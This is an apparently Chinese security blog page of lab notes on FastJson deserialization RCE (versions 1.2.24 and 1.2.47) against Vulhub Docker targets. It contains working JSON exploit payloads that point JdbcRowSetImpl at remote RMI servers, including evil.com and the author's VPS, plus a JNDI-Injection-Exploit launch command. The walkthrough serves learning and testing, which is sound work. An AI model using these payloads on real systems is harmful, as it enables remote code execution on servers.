@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.0.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-material.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"r0yanx.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="本文仅作为技术讨论及分享，严禁用于任何非法用途。 FastJson 1.2.24实验说明本次实验使用了Vulhub的fastjson 1.2.24 反序列化导致任意命令执行漏洞，漏洞利用使用了JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，漏洞地址为http:&#x2F;&#x2F;192.168.154.130:8090。 启动漏洞环境因为用了docker的漏洞环境，所以请先">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FastJson RCE实验笔记">
+<meta property="og:url" content="https://r0yanx.com/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="r0yanx&#39;s Blog">
+<meta property="og:description" content="本文仅作为技术讨论及分享，严禁用于任何非法用途。 FastJson 1.2.24实验说明本次实验使用了Vulhub的fastjson 1.2.24 反序列化导致任意命令执行漏洞，漏洞利用使用了JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，漏洞地址为http:&#x2F;&#x2F;192.168.154.130:8090。 启动漏洞环境因为用了docker的漏洞环境，所以请先">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://r0yanx.com/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-10-51-27.png">
+<meta property="og:image" content="https://r0yanx.com/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-10-52-07.png">
+<meta property="og:image" content="https://r0yanx.com/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-10-56-47.png">
+<meta property="og:image" content="https://r0yanx.com/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-09-57.png">
+<meta property="og:image" content="https://r0yanx.com/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-13-15.png">
+<meta property="og:image" content="https://r0yanx.com/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-14-47.png">
+<meta property="og:image" content="https://r0yanx.com/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-21-45.png">
+<meta property="og:image" content="https://r0yanx.com/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-39-21.png">
+<meta property="og:image" content="https://r0yanx.com/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-50-43.png">
+<meta property="og:image" content="https://r0yanx.com/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-52-16.png">
+<meta property="og:image" content="https://r0yanx.com/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-12-01-02.png">
+<meta property="og:image" content="https://r0yanx.com/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-12-01-35.png">
+<meta property="og:image" content="https://r0yanx.com/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-13-53-08.png">
+<meta property="og:image" content="https://r0yanx.com/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-13-53-33.png">
+<meta property="article:published_time" content="2021-08-29T02:25:18.000Z">
+<meta property="article:modified_time" content="2021-08-29T06:15:07.195Z">
+<meta property="article:author" content="r0yanx">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="WEB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://r0yanx.com/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-10-51-27.png">
+
+<link rel="canonical" href="https://r0yanx.com/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>FastJson RCE实验笔记 | r0yanx's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">r0yanx's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">信息安全点点滴滴</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/ryaninf" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://r0yanx.com/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="r0yanx">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="r0yanx's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          FastJson RCE实验笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-08-29 10:25:18 / 修改时间：14:15:07" itemprop="dateCreated datePublished" datetime="2021-08-29T10:25:18+08:00">2021-08-29</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="FastJson-1-2-24"><a href="#FastJson-1-2-24" class="headerlink" title="FastJson 1.2.24"></a>FastJson 1.2.24</h3><h4 id="实验说明"><a href="#实验说明" class="headerlink" title="实验说明"></a>实验说明</h4><p>本次实验使用了<code>Vulhub</code>的<code>fastjson 1.2.24 反序列化导致任意命令执行漏洞</code>，漏洞利用使用了<code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>，漏洞地址为<code>http://192.168.154.130:8090</code>。</p>
+<h4 id="启动漏洞环境"><a href="#启动漏洞环境" class="headerlink" title="启动漏洞环境"></a>启动漏洞环境</h4><p>因为用了docker的漏洞环境，所以请先安装<code>docker</code>及<code>docker-compose</code>，此处不再赘述。在靶机运行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub/fastjson/1.2.24-rce/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-10-51-27.png"><br>启动后可访问FastJson的服务：<br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-10-52-07.png"></p>
+<a id="more"></a>
+<h4 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h4><p>这里使用了burpsuite的BurpFastJsonScan插件：<a target="_blank" rel="noopener" href="https://github.com/pmiaowu/BurpFastJsonScan%E3%80%82">https://github.com/pmiaowu/BurpFastJsonScan。</a><br>经过扫描可以看到存在漏洞：<br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-10-56-47.png"></p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>首先要启动一个<code>RMI</code>或者<code>LDAP</code>服务，我这里使用的是<code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>，相对<code>marshalsec</code>来说它的操作步骤要少一些。</p>
+<p><strong><code>JNDI-Injection-Exploit</code>的官方说明如下：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]</span><br><span class="line"></span><br><span class="line">-C - 远程class文件中要执行的命令。</span><br><span class="line"></span><br><span class="line">（可选项 , 默认命令是mac下打开计算器，即&quot;open &#x2F;Applications&#x2F;Calculator.app&quot;）</span><br><span class="line"></span><br><span class="line">-A - 服务器地址，可以是IP地址或者域名。</span><br><span class="line"></span><br><span class="line">（可选项 , 默认地址是第一个网卡地址）</span><br></pre></td></tr></table></figure>
+<p>为了方便和安全起见，我使用了<code>docker</code>来启动它。先把<code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>下载到<code>/root/tools/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>，在vps上启动命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd  --rm -p 8180:8180 -p 1099:1099 -p 1389:1389 -v /root/tools/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar:/root/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar java java -jar /root/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&quot;ping jndi.265orc.dnslog.cn&quot;</span> -A 1xx.xx.xx.xx6</span><br></pre></td></tr></table></figure>
+<p>然后通过<code>docker logs</code>命令查询容器输出日志，这里的<code>13</code>是容器的id，在上条命令执行完毕后会输出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs 13</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-09-57.png"></p>
+<p>在burp抓包后放入poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://1xx.xx.xx.xx6:1099/07l8x5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-13-15.png"></p>
+<p>dnslog中可以看到命令执行成功<br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-14-47.png"></p>
+<p>ldap协议的利用方式也是相同：<br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-21-45.png"></p>
+<h3 id="FastJson-1-2-47"><a href="#FastJson-1-2-47" class="headerlink" title="FastJson 1.2.47"></a>FastJson 1.2.47</h3><h4 id="启动漏洞环境-1"><a href="#启动漏洞环境-1" class="headerlink" title="启动漏洞环境"></a>启动漏洞环境</h4><p><code>FastJson 1.2.47</code>的漏洞环境<code>Vulhub</code>也有，所以步骤相似：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ../1.2.247-rce/</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-39-21.png"></p>
+<h4 id="漏洞扫描-1"><a href="#漏洞扫描-1" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h4><p>同样是使用BurpFastJsonScan插件扫描，这次插件却在一开始并没有扫出来，需要手动POST一个json包后才开始了扫描，可能跟插件工作逻辑有关。<br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-50-43.png"></p>
+<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-11-52-16.png"></p>
+<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>漏洞利用还是使用上一节用到的<code>JNDI-Injection-Exploit</code>，exp如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;a&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line">        <span class="string">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;b&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">        <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://evil.com:9999/Exploit&quot;</span>,</span><br><span class="line">        <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-12-01-02.png"><br>因为在上一节的测试中发现<code>dnslog.cn</code>生成的随机域名有效期比较短，容易导致明明命令执行了却看不到dnslog的问题，所以改用了<code>ceye.io</code>测试，可以看到靶机curl请求了<code>ceye.io</code>的http服务：<br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-12-01-35.png"></p>
+<h3 id="fastjson-lt-1-2-47"><a href="#fastjson-lt-1-2-47" class="headerlink" title="fastjson&lt;=1.2.47"></a>fastjson&lt;=1.2.47</h3><p>对版本小于1.2.48的版本通杀，autoType为关闭状态也可用。方法同上，直接打了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> <span class="string">&quot;a&quot;</span>: &#123;</span><br><span class="line"> <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>, </span><br><span class="line"> <span class="string">&quot;val&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line"> &#125;, </span><br><span class="line"> <span class="string">&quot;b&quot;</span>: &#123;</span><br><span class="line"> <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, </span><br><span class="line"> <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;rmi://evil.com:9999/Exploit&quot;</span>, </span><br><span class="line"> <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-13-53-08.png"><br><img data-src="/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/2021-08-29-13-53-33.png"></p>
+<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>其它几个fastjson版本的exp需要autoTypeSupport属性为true才能使用，而fastjson&gt;=1.2.25默认为false，相对碰到的情况应该比较少，不一一尝试。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/283585.html">https://www.freebuf.com/articles/web/283585.html</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>r0yanx
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://r0yanx.com/2021/08/29/FastJson-RCE%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" title="FastJson RCE实验笔记">https://r0yanx.com/2021/08/29/FastJson-RCE实验笔记/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/WEB/" rel="tag"># WEB</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/07/18/%E8%AE%B0%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84CTF%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/" rel="prev" title="记一道限制长度命令执行的CTF解题过程">
+      <i class="fa fa-chevron-left"></i> 记一道限制长度命令执行的CTF解题过程
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC80NTQyMS8yMTkzMw=="></div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#FastJson-1-2-24"><span class="nav-number">1.</span> <span class="nav-text">FastJson 1.2.24</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%AF%B4%E6%98%8E"><span class="nav-number">1.1.</span> <span class="nav-text">实验说明</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="nav-number">1.2.</span> <span class="nav-text">启动漏洞环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">1.4.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FastJson-1-2-47"><span class="nav-number">2.</span> <span class="nav-text">FastJson 1.2.47</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-1"><span class="nav-number">2.1.</span> <span class="nav-text">启动漏洞环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-1"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastjson-lt-1-2-47"><span class="nav-number">3.</span> <span class="nav-text">fastjson&lt;&#x3D;1.2.47</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E5%AE%83"><span class="nav-number">4.</span> <span class="nav-text">其它</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span 